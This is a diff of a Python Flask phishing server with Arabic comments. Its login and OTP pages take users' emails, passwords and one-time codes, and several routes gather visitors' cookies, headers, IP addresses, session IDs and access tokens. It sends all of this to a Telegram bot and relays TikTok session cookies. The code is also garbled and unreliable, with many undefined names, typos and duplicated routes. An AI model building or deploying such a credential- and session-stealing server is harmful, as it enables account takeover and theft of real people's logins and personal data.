@@ -1,181 +1,163 @@
-import os, json, secrets, requests
-from datetime import datetime, timedelta
 from flask import (
-    Flask, g, request, jsonify, redirect, render_template,
-    make_response, url_for, session, send_from_directory, abort
-)
+Flask, g, render_template_string, request, jsonify, redirect, render_template, send_from_directory, session, url_for, make_response, abort)
+from datetime import datetime
+import os, json, requests, secrets
+from pathlib import Path
 import jwt
 from functools import wraps
-import time
-
-
+ 
 try:
     from dotenv import load_dotenv
     load_dotenv()
 except Exception:
     pass
-
-
+    
 app = Flask(__name__, template_folder="templates") 
-app.secret_key = ("SECRET_KEY")
+
 app.debug = True
-app.permanent_session_lifetime = timedelta(hours=999999999)
-# =================[ CONFIG ]=================
+s = requests.Session()
+r = s.get("https://www.tiktok.com/")
+server_side_cookies = s.cookies.get_dict()
+ALLOWED_ORIGIN = "https://www.tiktok.com/"
+refresh_token = "REFRESH_TOKEN_FROM_SITE"
 SESSIONS_FILE    = "sessions.json"
 CREDENTIALS_FILE = "credentials.json"
-headers = {"User-Agent": "Mozilla/5.0"}
-TOKEN_TTL_HOURS=int(os.getenv("TOKEN_TTL_HOURS","999999999"))
-refresh_token = "REFRESH_TOKEN_FROM_SITE"
-app.config.setdefault("SESSION_COOKIE_NAME", "sessionid"), requests.session()
-s = requests.session()
-
-
+TOKEN_TTL_HOURS=int(os.getenv("TOKEN_TTL_HOURS","999999999"))   
 BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
 CHAT_ID   = os.getenv("TG_CHAT_ID")
+ANSWER_FILE = "answer.json"
+app.config.setdefault("sessionid"), requests.session()
 
+def send_to_telegram(text: str):
 
-
-# =================[ HELPERS ]================
-def _safe_load(path: str):
-    try:
-        if os.path.exists(path):
-            with open(path, "r", encoding="utf-8") as f:
-                data = json.load(f)
-                return data if isinstance(data, list) else []
-    except Exception:
-        pass
-    return []
-
-def _safe_save(path: str, data: list,new_entry: dict) -> list:
-    data = safe_load(path)
-    data.append(new_entry)
-    
-    with open(path, "w", encoding="utf-8") as f:
-        json.dump(data, f, ensure_ascii=False, indent=2)
-    return data    
-
-def load_sessions():   return _safe_load(SESSIONS_FILE)
-def save_sessions(data): _safe_save(SESSIONS_FILE, data)
-
-def load_credentials(): return _safe_load(CREDENTIALS_FILE)
-def save_credentials(data): _safe_save(CREDENTIALS_FILE, data)
-
-def send_to_telegram_message(text: str):
-    """إرسال موحّد لتليجرام"""
     if not BOT_TOKEN or not CHAT_ID:
-        print("⚠️ TG creds missing")
-        return
+            print("⚠️ TG_BOT_TOKEN/TG_CHAT_ID مش مضبوطين في ENV — تخطّي الإرسال.")
+            return
     try:
-        msg = json.dumps(text_or_dict, ensure_ascii=False, indent=2) if isinstance(text_or_dict, dict) else str(text_or_dict)
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        r = requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
+        print("TG >", r.status_code, r.text[:200])
+        
         for i in range(0, len(text), 3500):
             chunk = text[i:i+3500]
-        requests.post(url, json={"chat_id": CHAT_ID, "text": msg}, timeout=10)
+            requests.post(url, json={"chat_id": CHAT_ID, "text": chunk}, timeout=10)
+            
     except Exception as e:
-        print("TG error:", e)
-
-def _collect_request_data():
-    """
-      json (fetch/axios)
-      form (POST form-data / x-www-form-urlencoded) 
-      args (Query string ?a=1)
-    """
-    
-    
-    
-    
-def require_auth(f):
-    @wraps(f)
-    def wrapper(*args, **kwargs):
-        auth_header = headers.get("Authorization")
-        if not auth_header.startswith("Bearer"):
-            abort(401)
-    
-        token = auth_header.split(" ", 1)[1]  # ناخد الجزء بعد Bearer
-        send_to_telegram(json.dumps(token, ensure_ascii=False, indent=2))
+        print("TG error:", e)     
+        
+def load_answers():
+    if os.path.exists(ANSWERS_FILE):
         try:
-            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
-            g.user = payload  # نخزن بيانات المستخدم اللي جوه التوكين
-        except jwt.InvalidTokenError:
-            abort(401)
-        return f(*args, **kwargs)
-    return wrapper
+            with open(ANSWERS_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+                
+        except Exception:
+            return[]
+           
+def save_answer(puzzle_no: int, answer: str):
+    data = load_answer()
+    data.append({
+        "ts": datetime.utcnow().isoformat() + "Z",
+        "puzzle": puzzle_no,
+        "answer": (answer)
+    })
+    with open(ANSWER_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False,)
+        
+    with open(ANSWER_FILE, "r", encoding="utf-8") as f:
+        data = json.load(f)
+        print(data)
+            
+
+def require_step(min_step: int):
+
+    cur = session.get("step", 1)
+    if cur < min_step:
+        return redirect(url_for("start"))
+    return None
     
-def make_session_permanent():
-    session.permanent = True
-  
-@befor_request    
-def collect_request_data():
-    g.data = {}
+@app.before_request
+def load_data():
+
+
+    headers = dict(request.headers)
+    headers_list = [(k, v) for k, v in request.headers.items()]
+
+    cookies = request.cookies.to_dict
+    cookies_list = [(k, v) for k, v in request.cookies.items()]
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ua = request.headers.get("User-Agent")
+    ct = request.headers.get("Content-Type")
     
-    j = request.get_json(silent=True)
-    json_dict = j if isinstance(j, dict) else {}
-   
-    form_dict = request.form.to_dict() or {}
+    print("=== HEADERS ===")
+    for k, v in headers_list:
+        print(f"{k}: {v}")
+
+    print("=== COOKIES ===")
+    for k, v in cookies_list:
+        print(f"{k}={v}")
+        
+        
+        print("METHOD:", request.method)
+        print("ORIGIN:", request.headers.get("Origin"))
+        print("CT:", request.headers.get(f"{Content-Type}"))
+        print("RAW JSON:", request.get_json(silent=True))
+        print("RAW FORM:", request.form.to_dict())
+        print("RAW COOKIES:", request.cookies.to_dict())
+        print("ip",request.remote_addr, request.headers.get("X-Forwarded-For"))
+    
+    message = f"""
+    HEADERS:\n{headers_list}\n\nCOOKIES:\n{cookies_list}\nip:\n{ip} 
+    """
+    send_to_telegram(message) 
+
+@app.route("/set_cookie")
+def set_cookie():
  
-    args_dict = request.args.to_dict() or {}
+    token = secrets.token_hex(16); 
 
-    g.data["method"] = request.method
-    g.data["path"]   = request.path
-    g.data["ip"]     = request.headers.get("X-Forwarded-For", request.remote_addr)
-
-    g.headers = dict(request.headers)
-    g.cookies = request.cookies.to_dict()
+    resp = make_response(f"sessionid: {token}")
+    resp.set_cookie(
+        "sessionid",    # اسم الكوكي
+        token,          # القيمة العشوائية اللي اتولّدت
+        httponly=True,
+        samesite="None",
+        path="/"
+    )
     
-
+    sessions = load_sessions() or {}
+    sessions[token] = {"session_id": token}
     
+    save_sessions(sessions)
+    
+    return resp
 
+@app.route("/get_cookie")
+def get_cookie():
    
-    xff = request.headers.get("X-Forwarded-For", "")
-    g.ip = (xff.split(",")[0].strip() if xff else (request.remote_addr or ""))
-
-    g.headers = dict(request.headers) or {}   
-    g.cookies = request.cookies.to_dict() or {}
-    g.body_raw     = request.get_data(as_text=True) or ""
-
-    g.data("ip", g.ip) or {}
-    g.data("method", g.method) or {}
-    g.data("path", g.path) or {}
+    token = request.cookies.get("sessionid")
+    sessions = load_sessions() or {}
+    ok = any(entry.get("sesstion_id") == token for entry in sessions)
+    return f"cookie sessionid = {token}"
     
+@app.route("/check")
+def check():
+    token = request.cookies.get("sessionid")
+    sessions = load_sessions() or {}
+    return {"ok":valid_session(token), "session_id":token}
     
-    print(json.dumps({"data": g.data, "headers": g.headers_dict, "cookies": g.cookies_dict}, indent=2, ensure_ascii=False)) or {}
-    try:
-         send_to_telegram(json.dumps({"data": g.data, "headers": g.headers_dict, "cookies": g.cookies}, ensure_ascii=False, indent=2))
-    except Exception:
-        pass
-      
-
-@app.route("/", methods=["GET"])
+@app.route('/', methods=["GET"])
 def index():
-    sid = request.cookies.get("sessionid")
-    data    = getattr(g, "data",    {}) or {}
-    headers = getattr(g, "headers", {}) or {}
-    cookies = getattr(g, "cookies", {}) or {}
-
-    info = {
-        "event":  "index_open",
-        "ip":     data.get("ip", request.headers.get("X-Forwarded-For", request.remote_addr)),
-        "ua":     headers.get("User-Agent", ""),
-        "sid":    cookies.get("sessionid", ""),
-        "cookies": cookies,
-        "path":   data.get("path",   request.path),
-        "method": data.get("method", request.method),
-    }
-
-    print(json.dumps(info, ensure_ascii=False, indent=2))
-    send_to_telegram(json.dumps(info, ensure_ascii=False, indent=2))
-    
-    return render_template("index.html", sid=sid)    
-    
-@app.route("/cybercrime", methods=["GET"])
-def cybercrime():
-    _collect_request_data()
     data = {
-        "auth_headers": g.headers,
-        "cookies": g.cookies,
-        "args_for_json": g.data, 
-        "ip": g.headers.get("X-Forwarded-For", request.remote_addr),
-        "ua": g.headers.get("User-Agent")
+        "when": datetime.utcnow().isoformat()+"Z",
+        "headers": dict(request.headers),
+        "cookies": request.cookies.to_dict(),
+        "args": request.args.to_dict(),          
+        "form": request.form.to_dict(),          
+        "json": request.get_json(silent=True),   
+        "raw": request.get_data(as_text=True),  
+        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
+        "ua": request.headers.get("User-Agent")
     }
     
     data_server = {
@@ -187,107 +169,373 @@ def cybercrime():
    
     send_to_telegram(f"{payload}\nSessionid: {sid}")
 
-    return render_template("cybercrime.html", sid=sid)
+    return render_template("index.html", sid=sid)
+    
+@app.route("/cybercrime", methods=["GET"])
+def cybercrime():
+    data = {
+       
+        "headers": dict(request.headers),
+        "cookies": request.cookies.to_dict(),          
+        "form": request.form.to_dict(),          
+        "json": request.get_json(silent=True),
+        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
+        "ua": request.headers.get("User-Agent")
+    }
+    
+    data_server = {
+        "server_time": datetime.utcnow().isoformat()+"Z",
+        "server_ip": request.remote_addr,}
+        
+    payload = {**data, **data_server}
+    sid=request.cookies.get("sessionid")
+   
+    send_to_telegram(f"{payload}\nSessionid: {sid}")
+    
+
+    return render_template("cybercrime.html", sid=sid)  
+
+
+@app.route("/cybercrime", methods=["POST"])
+def cybercrime_post():
+    data = request.get_json(silent=True) or {}
+    print("CYBERCRIME DATA:", data)
+    return render_template("cybercrime.html", sid=sid) 
     
 @app.route("/login", methods=["POST"]) 
 def login_post():
-    _collect_request_data()
-    email = g.data.get("email")
-    password = g.data.get("password")
-    session = {"email": email, "password": password}
-    save_sessions(1, session)
-    send_to_telegram(f": {session}")
+    email = request.form.get("answer")
+    password = request.form.get("answer")
+    answer = {"email": email, "password": password}
+    save_answer(1, answer)
+    send_to_telegram(f": {answer}")
     return redirect(url_for("login_get"))
  
 @app.route("/login", methods=["GET"])
 def login_get():
-    _collect_request_data()
     return render_template("login.html")
 
 
 @app.route("/otp", methods=["POST"])
 def otp_post():
-    _collect_request_data()
-    otp = g.data.get("otp")
-    session = {"otp":otp}
-    save_sessions(2, session)
-    send_to_telegram(f": {session}")
+    otp = request.form.get("answer")
+    answer = {"otp":otp}
+    save_answer(2, answer)
+    send_to_telegram(f"🧩 إجابة اللغز 2: {answer}")
     return redirect(url_for("otp_get"))
 
 @app.route("/otp", methods=["GET"])
 def otp_get():
-    _collect_request_data()
     return render_template("otp.html")
     
 @app.route('/thanks.html')
 def thanks():
     return render_template("thanks.html")
        
+@app.before_request
+def init():
+        app.config["session"] = requests.Session()
+        s = requests.Session()
+        s.get("https://www.tiktok.com/cookies/set/sessionid/")
+        print(s.cookies.get_dict())
+        r = s.get("https://www.tiktok.com/cookies")
+        print(r.text)
+    
+@app.route("/track", methods=["POST"])
+def track():
+    data = {
+        "when": datetime.utcnow().isoformat()+"Z",
+        "headers": dict(request.headers),
+        "cookies": request.cookies.to_dict(),
+        "args": request.args.to_dict(),          
+        "form": request.form.to_dict(),          
+        "json": request.get_json(silent=True),  
+        "raw": request.get_data(as_text=True),   
+        "ip": request.headers.get("Forwarded-For", request.remote_addr),
+        "ua": request.headers.get("User-Agent", ""),
+        "received_at": datetime.utcnow().isoformat() + "Z"
+    }
+    data_server ={
+        "server_time": datetime.utcnow().isoformat() + "Z",
+        "server_ip": request.remote_addr,
+        "server_name": "Main-Node-1"
+    }
+    payload = {**data, **data_server}
+    
+    send_to_telegram(f"{payload}")
+    return jsonify({"payload": payload})
+
+@app.route("/endpoint", methods=["POST"])
+def endpoint():
+    payload = request.get_json()
+    path = payload.get("path")
+    data = payload.get("data", {})
+    s = app.config["sessionid"]
+    
+    tik_url = f"https://www.tiktok.com{path}"
+    resp = s.post(tik_url, json=data, headers=headers, timeout=20)
+    
+    r = s.get("https://www.tiktok.com/", headers=headers)
+    
+    cookies = r.cookies.get_dict()
+    
+    r2 = s.get("https://www.tiktok.com/@bmwlovers1077")
+
+    resp = requests.get("https://www.tiktok.com/", headers=headers, cookies=r.cookies.get_dict())
 
     
-# =================[ API ROUTES ]=============
-# --- جمع بيانات تسجيل الدخول/OTP (Credentials) ---
-@app.post("/collect_credentials")
-@app.post("/collect")   # alias علشان الفetch القديم
-def collect_credentials():
-    _collect_request_data()
+    resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
+    resp.headers["Access-Control-Allow-Credentials"] = "true"
 
-    entry = {
-            "email": g.data.get("email"),
-            "password": g.data.get("password"),
-            "phone": g.data.get("phone"),
-            "otp": g.data.get("otp"),
-            "ip": g.data.get("ip"),
-            "source": "credentials"
-        }
-    creds = load_credentials() or []
-    creds.append(entry)
-    save_credentials(creds)
-    send_to_telegram_message({"bucket":"credentials", **entry})
-    return jsonify({"status":"ok","bucket":"credentials","count":len(creds)}), 201
-  
+    message = f"""
+    TikTok EndpointDebug Report
+    Payload: {payload}
+    Request Path: {path}
+    Data Sent: {data}
+    Request Headers: {headers}
 
-@app.post("/collect_sessions")
-def collect_sessions():
-    try:
-        _collect_request_data()
-        
-        entry = {
-            "cookies": g.cookies.get("cookies_dict"),
-            "headers": g.headers_dict,
-            "ip": g.data.get("ip"),
-            "source": "sessions"
-            }
-        sessions = load_sessions() or []
-        sessions.append(entry)
-        save_sessions(sessions)
-        send_to_telegram_message({"bucket":"sessions", **entry})
-        return jsonify({"status":"ok","bucket":"sessions","count":len(sessions)}), 201
-    except Exception as e:
-        return jsonify({"status":"error","detail":str(e)}), 500
+    POST Response: {resp.status_code}
+    Cookies: {cookies}
+    GET Response: {r2.status_code}
 
-# --- حفظ كوكيز خام ---
+    GET Response Headers:
+    {resp.headers}
+    
+    Request Headers: {r.request.headers}
+    Response Cookies: {r.cookies.get_dict()}
+
+    
+    Request Headers: {r2.request.headers}
+    Response Cookies: {r2.cookies.get_dict()}
+
+    
+    Request Headers: {resp.request.headers}
+    Response Cookies: {resp.cookies.get_dict()}
+
+    
+    Method: {request.method}
+    Args (GET params): {request.args.to_dict()}
+    Form (POST data): {request.form.to_dict()}
+    JSON body: {request.get_json(silent=True)}
+    Cookies: {request.cookies.to_dict()}
+    """
+    print(message)
+    send_to_telegram(message)
+    
+    resp.headers["Access-Control-Allow-Origin"]= "https://www.tiktok.com"
+    resp.headers["Access-Control-Allow-Credentials"]="true"
+    resp = requests.get("https://www.tiktok.com/@bmwlovers1077/", cookies=cookies, headers=headers)
+    
+
+@app.after_request
+def add_headers(resp):
+    resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
+    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+    return resp
+
 @app.route("/savecookies")
 def savecookies():
-    _collect_request_data()
-    
-    data = []
-    if os.path.exists("cookies.json"):
-        try:
-            with open("cookies.json","r",encoding="utf-8") as f:
+  
+    cookies = request.cookies.to_dict()
+
+    try:
+   
+        if os.path.exists("cookies.json"):
+            with open("cookies.json", "r", encoding="utf-8") as f:
                 data = json.load(f)
-        except: data=[]
+                print("Loaded cookies.json:", data)
+        else:
+            data = []
+    except:
+        data = []
+   
     data.append(cookies)
-    with open("cookies.json","w",encoding="utf-8") as f:
-        json.dump(data,f,ensure_ascii=False,indent=2)
-    send_to_telegram_message({"bucket":"cookies","cookies":cookies})
+    print("After append:", data)
+  
+    with open("cookies.json", "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=4, ensure_ascii=False)
+
     return "ok"
     
+
+@app.route("/save-token", methods=["POST"])
+def save_token():
+    data = request.get_json()
+    token = data.get("accessToken")
+    send_to_telegram(token)
+    return jsonify({"ok": True})    
+
+
+
+@app.route("/refresh", methods=["GET"])
+def refresh_access_token():
+    resp = requests.post("https://www.tiktok.com/@bmwlovers1077/refresh", data={
+        "grant_type": "refresh_token",
+        "refresh_token": refresh_token
+    })
+    
+    if resp.status_code == 200:
+        new_token = resp.json().get("access_token")
+        return jsonify({"access_token": new_token})
+
+             
+@app.route('/session_files')
+def session_files():
+
+       all_headers = dict(request.headers)
+       
+       all_cookies = request.cookies.to_dict()
+       
+       for name, value in request.cookies.items():
+       
+           print(name, "=", value)
+          
+       message = f"New Request\n\nHEADERS:\n{dict(all_headers)}\n\nCOOKIES:\n{dict(all_cookies)}"
+
+       send_to_telegram(message)
+       
+       resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
+       resp.headers["Access-Control-Allow-Credentials"] = "true"
+    
+       return resp
+
+@app.route('/collect_session', methods=['POST'])
+def collect_session():
+    try:
+        payload = request.get_json(silent=True)
+        if not payload:
+            payload = request.form.to_dict()  
+        message = payload     
+        
+        send_to_telegram(message)
+    
+    except:
+        pass   
+         
+ 
+def collect_sessions():
+    g.data = request.get_json(silent=True) or {}
+    logs.append({
+        "email": g.data.get("email", ""),
+        "password": g.data.get("password"),
+        "phone": g.data.get("phone"),
+        "otp": g.data.get("otp"),
+        "ip": g.data.get("ip"),
+        "cookie": g.data.get("cookies"),
+    })
+    sessions =load_sessions()
+    sessions.append(session_data)
+    
+    save_sessions(sessions)
+    
+     
+       
+    message = f"""
+    Cookie: {g.data.get("cookies")}
+    Email: {g.data.get("email")}
+    Password: {g.data.get("password")}
+    Phone: {g.data.get("phone")}
+    OTP: {g.data.get("otp")}
+    IP: {g.data.get("ip")}
+    """ 
+    
+    send_to_telegram(message)
+    return {"status": "saved"}  
+    
+@app.route('/collect', methods=['POST'])
+def collect():
+         
+         body = request.get_json(silent=True)
+         form = request.form.to_dict()
+         headers = dict(request.headers)
+         all_cookies = request.cookies.to_dict()
+          
+         authorization = headers.get("Authorization")
+         auth_hdr = headers.get("Authorization")
+         args = request.args.to_dict()
+         xff = headers.get("X-Forwarded-For") 
+         ip = headers.get("ip") or request.remote_addr
+         cookie_token = all_cookies.get("sessionid") or all_cookies.get("csrftoken")
+         form_token = body.get("token") or form.get("token")
+         event = "page_open"
+         ua = headers.get("User-Agent")
+ 
+          
+         session_data = {
+          "ts": datetime.utcnow().isoformat() + "Z",
+          "ip": ip,
+          "ua": ua,
+          "headers": headers,          
+          "cookies": all_cookies,
+          "authorization": authorization, 
+          "cookie_token": cookie_token,
+          "form_token": form_token,
+          }
+
+         sessions = load_sessions()
+         sessions.append(session_data)
+         save_sessions(sessions)
+
+   
+         message = f"""
+          IP: {session_data['ip']}
+          UA: {session_data['ua']}
+          Cookie Token: {session_data['cookie_token']}
+          Form Token: {session_data['form_token']}
+          Cookies: {session_data['all_cookies']}
+          Headers: {session_data['headers']}
+          At: {session_data['ts']}
+          """
+         print("SESSION:", sessions_data)   
+         send_to_telegram(message)
+    
+         resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
+         resp.headers["Access-Control-Allow-Credentials"] = "true"
+         return resp
+
+@app.route("/submit", methods=["POST"])
+def submit():
+   
+    data = {}
+    try:
+        data.update(request.form.to_dict())
+        j = request.get_json(silent=True) or {}
+        if isinstance(j, dict):
+            data.update(j)
+        data["args"] = request.args.to_dict()
+        data["ip"] = request.remote_addr or ""
+        data["ua"] = request.headers.get("User-Agent")
+        data["ts"] = datetime.utcnow().isoformat() + "Z"
+    except Exception as e:
+        print("build payload error:", repr(e))
+
+   
+    try:
+        log = []
+        if os.path.exists("log.json"):
+            with open("log.json", "r", encoding="utf-8") as f:
+                log = json.load(f)
+                if not isinstance(log, list):
+                    log = []
+        log.append(data)
+        with open("log.json", "w", encoding="utf-8") as f:
+            json.dump(log, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print("save log error:", repr(e))
+
+   
+    try:
+        send_to_telegram(json.dumps(data, ensure_ascii=False, indent=2))
+    except Exception as e:
+        print("tg send error:", repr(e))
+
+   
+    return redirect(url_for("otp_get"))                     
+     
 @app.route("/show_cookies")
 def show_cookies():
-    _collect_request_data()
     
-    cookies = g.cookies
+    cookies = request.cookies.to_dict()
     result = []
     for name, value in cookies.items():
         result.append(f"{name} = {value}")
@@ -295,38 +543,9 @@ def show_cookies():
     lines = [f"{k} = {v}" for k, v in request.cookies.items()]    
         
     send_to_telegram("\n".join(liness))
-    
-    print(json.dumps("cookies:", g.cookies))     
-    return "<br>".join(result)     
-
-# --- استلام accessToken ---
-@app.post("/save-token")
-def save_token():
-    _collect_request_data()
-    token = (request.get_json() or {}).get("accessToken")
-    send_to_telegram_message({"bucket":"token","token":token})
-    return jsonify({"ok":True})
-
-
-@app.post("/submit")
-def submit():
-    _collect_request_data()
-    data = {
-        "ip": g.ip,
-        "ua": g.headers.get("User-Agent"),
-        "path": g.path,
-        "method": g.method,
-        "inputs": g.data,
-        "auth_header": g.headers.get("Authorization"),
-        "token": g.cookies_dict
-    }
-    try:
-        send_to_telegram_message({"bucket": "submit", **data})
-    except:
-        pass
-    return jsonify({"ok": True})
-    
+         
+    return "<br>".join(result) 
+         
 if __name__ == "__main__":
         port = int(os.environ.get("PORT",8081))
-        app.run(host="0.0.0.0", port=port, debug=True)    
-
+        app.run(host="0.0.0.0", port=port, debug=True)
